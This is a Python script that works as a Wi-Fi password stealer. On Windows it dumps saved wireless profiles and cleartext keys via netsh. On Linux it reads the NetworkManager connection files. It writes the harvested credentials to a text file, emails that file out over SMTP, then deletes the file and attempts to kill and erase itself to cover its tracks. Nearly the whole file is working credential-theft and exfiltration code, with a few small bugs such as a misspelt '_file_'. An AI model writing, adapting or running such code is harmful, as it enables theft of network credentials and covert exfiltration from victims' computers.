import os
import smtplib
import subprocess
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import glob

system_information = "Informations.txt"
var = 2

# LOOK READ.ME FOR GET USERNAME AND PASSWORD.

# ==============================
# ==============================

username = "YOUR SMTP USERNAME"
password= "YOUR SMTP PASSWORD"

# ==============================
# ==============================

file_path = os.getcwd()
email_address = 'smtp.mailtrap.io'


def send_email(filename, attachment):
    fromaddr = email_address
    toaddr = email_address
    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())

    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.mailtrap.io', 587)
    s.starttls()
    s.login(username, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()


if os.name == "nt":
    output = subprocess.check_output("netsh wlan show profile", shell=True)
    output = str(output)
    start = output.find("Profile :")
    end = output.find("\\r\\n")
    substring = output[start:end]
    list_of_word = output.split()
    j = 2
    with open(file_path + "\\" + system_information, "a") as f:
        f.write("All of Registered Connections\n")
        f.write("==================================\n")
        f.close()
    for word in output.split():
        if word == "Profile":
            next_word = list_of_word[list_of_word.index(word) + j]
            next_word = next_word.split('\\r\\n')[0]
            k = j + 1
            try:
                while "All" not in next_word:
                    next_word += " " + list_of_word[list_of_word.index(word) + k]
                    k = k + 1
            except:
                pass
            next_word = next_word.split('\\r\\n')[0]
            if ':' in next_word:
                next_word = next_word.split(':')[1]
                if ' ' in next_word:
                    next_word = next_word.replace(' ', "")
            wifi = subprocess.check_output('netsh wlan show profile ' + '"' + next_word + '"' + ' key=clear',
                                           shell=True)
            wifi = str(wifi)
            start = wifi.find("Key Content")
            end = wifi.find("Cost settings")
            key_content = "Content"
            substring = wifi[start:end]
            list_of_words = wifi.split()
            with open(file_path + "\\" + system_information, "a") as f:
                f.write(next_word + "\n")
                f.close()
            j = j + 5
            try:
                next_word = list_of_words[list_of_words.index(key_content) + 2]
                i = 2
                for words in wifi.split():
                    if words == "Content":
                        next_word = list_of_words[list_of_words.index(key_content) + i]
                        next_word = next_word.split('\\r\\n\\r\\nCost')[0]
                        next_word = next_word.replace(' ', "\\ ")
                        i = i + 5
                        with open(file_path + "\\" + system_information, "a") as f:
                            f.write(" : " + next_word + "\n")
                            f.close()
            except:
                pass
    try:
        pwd = os.path.abspath(os.getcwd())
        os.system("cd " + pwd)
        os.system("TASKKILL /F /IM " + os.path.basename(__file__))
        print('File was closed.')
        os.system("DEL " + os.path.basename(__file__))
    except OSError:
        print('File is close.')
else:
    os.system("chmod +x " + os.path.basename(_file_))
    try:
        output = glob.glob("/etc/NetworkManager/system-connections/*")

        res = [sub.replace(' ', "\ ") for sub in output]
        for i in res:
            output = subprocess.check_output("cat " + i, shell=True)
            output = str(output)
            with open(file_path + "\\" + system_information, "a") as f:
                f.write(output + "\n===========================\n")
                f.close()
    except:
        pass
    try:
        pwd = os.path.abspath(os.getcwd())
        os.system("cd " + pwd)
        os.system('pkill leafpad')
        os.system("chattr -i " + os.path.basename(__file__))
        print('File was closed.')
        os.system("rm -rf" + os.path.basename(__file__))
    except OSError:
        print('File is close.')
    #os.system("./" + os.path.basename(_file_))
send_email(system_information, file_path + "\\" + system_information)
os.remove("Informations.txt")
